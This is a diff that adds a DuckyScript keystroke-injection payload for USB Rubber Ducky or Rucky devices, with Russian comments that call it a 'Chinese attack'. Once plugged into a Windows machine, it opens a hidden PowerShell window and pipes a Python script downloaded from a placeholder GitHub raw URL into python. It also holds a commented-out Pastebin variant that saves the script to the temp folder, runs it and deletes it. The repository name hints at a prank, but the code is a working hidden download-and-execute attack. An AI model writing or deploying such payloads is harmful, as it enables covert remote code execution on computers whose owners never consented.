@@ -1,0 +1,26 @@
+REM ================================================
+REM Китайская атака - Windows HID Payload
+REM Для USB Rubber Ducky / Rucky
+REM ================================================
+REM Открывает PowerShell и загружает скрипт с GitHub/Pastebin
+REM ================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Загружаем и запускаем скрипт с GitHub
+STRING irm https://raw.githubusercontent.com/YOUR_USERNAME/hamster_prank/main/payloads/chinese_attack_windows.py | python
+ENTER
+
+REM Альтернатива - загрузка с Pastebin
+REM STRING $url='https://pastebin.com/raw/YOUR_PASTE_ID'; iwr $url -OutFile $env:TEMP\attack.py; python $env:TEMP\attack.py; rm $env:TEMP\attack.py
+REM ENTER
+
+REM Закрываем PowerShell
+DELAY 500
+STRING exit
+ENTER
